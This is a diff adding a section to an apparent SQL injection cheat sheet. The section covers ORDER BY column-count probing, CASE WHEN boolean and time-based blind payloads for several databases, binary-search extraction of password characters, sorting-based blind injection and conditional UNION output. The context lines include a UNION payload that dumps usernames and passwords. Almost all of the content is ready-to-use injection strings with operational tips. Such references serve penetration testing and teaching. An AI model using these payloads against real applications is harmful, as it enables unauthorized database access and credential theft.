@@ -320,6 +320,106 @@ SQLite:
 ' UNION SELECT NULL,group_concat(username||':'||password,char(10)),NULL FROM users--
 ```
 
+## ORDER BY and CASE WHEN
+
+### ORDER BY syntax
+
+```sql
+SELECT * FROM users ORDER BY 1;              -- first column, ascending
+SELECT * FROM users ORDER BY 3 DESC;         -- third column, descending
+SELECT * FROM users ORDER BY username;       -- column name
+SELECT * FROM users ORDER BY 1,2;            -- multiple sort keys
+SELECT * FROM users ORDER BY 1 ASC, 2 DESC;  -- explicit direction
+```
+
+- The number is a position in the SELECT list, starting at 1. That makes it usable as a column-count probe when column names are unknown.
+- `ASC` is the default and can be omitted. `DESC` sorts descending.
+- When the original query already has an ORDER BY, comment out the tail so the injected clause is the only one.
+- Confirm the count with `UNION SELECT NULL,...` before writing a UNION payload.
+
+Column-count probing:
+
+```
+' ORDER BY 1-- -    normal
+' ORDER BY 2-- -    normal
+' ORDER BY 3-- -    normal
+' ORDER BY 4-- -    error -> 3 columns
+```
+
+- The last working n is the column count; the n that errors is not.
+- Some DBMS respond with an empty page or a different ordering instead of an error. Increase the number of NULLs in `UNION SELECT NULL,...` until it works.
+- If ORDER BY is filtered, try `GROUP BY n` or `UNION SELECT NULL,NULL,...`.
+
+DBMS notes:
+
+- MySQL: positional ORDER BY works; `--` needs a following space.
+- MSSQL: positional ORDER BY works; `--` needs no extra space.
+- PostgreSQL: positional ORDER BY works; `NULLS FIRST` and `NULLS LAST` are available.
+- Oracle: positional ORDER BY works; a standalone SELECT needs `FROM dual`.
+- SQLite: positional ORDER BY works.
+
+### CASE WHEN syntax
+
+Searched CASE is the useful form in injection because the condition can be any expression or subquery.
+
+```sql
+CASE WHEN condition1 THEN value1 WHEN condition2 THEN value2 ELSE value3 END
+CASE expression WHEN value1 THEN result1 WHEN value2 THEN result2 ELSE result3 END
+```
+
+- Always close with END. All THEN/ELSE branches must return the same type.
+- Oracle needs `FROM dual` for a standalone SELECT.
+
+Turn a condition into a number:
+
+```sql
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- -
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users)>5 THEN 1 ELSE 0 END)=1-- -
+' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name LIKE 'a%')>0 THEN 1 ELSE 0 END)=1-- -
+```
+
+Time-based blind:
+
+```sql
+-- MySQL
+' AND (CASE WHEN (condition) THEN SLEEP(5) ELSE 0 END)-- -
+
+-- PostgreSQL
+' AND (SELECT CASE WHEN (condition) THEN pg_sleep(5) ELSE pg_sleep(0) END IS NOT NULL)-- -
+
+-- MSSQL: WAITFOR cannot appear inside CASE, use IF
+'; IF(condition) WAITFOR DELAY '0:0:5'--
+
+-- Oracle
+' AND (SELECT CASE WHEN (condition) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 'a' END FROM dual)='a'--
+```
+
+- Verify the false branch has no delay; if both branches delay, the check is useless.
+- MySQL `SLEEP()` returns 0 on completion, so the expression becomes `AND 0` while the delay still happens.
+
+Character extraction by binary search:
+
+```sql
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64) THEN 1 ELSE 0 END)=1-- -
+```
+
+- Seven requests per character instead of about 95.
+- MSSQL uses `SUBSTRING`, PostgreSQL uses `substring`, Oracle uses `SUBSTR`.
+
+Sorting-based blind:
+
+```sql
+' ORDER BY (CASE WHEN (condition) THEN 1 ELSE 2 END)-- -
+```
+
+- True sorts ascending, false sorts by the other value; compare the first row.
+
+Conditional output in a UNION:
+
+```sql
+' UNION SELECT 1,(CASE WHEN (condition) THEN 'YES' ELSE 'NO' END),3-- -
+```
+
 ## information_schema cheat sheet
 
 MySQL:
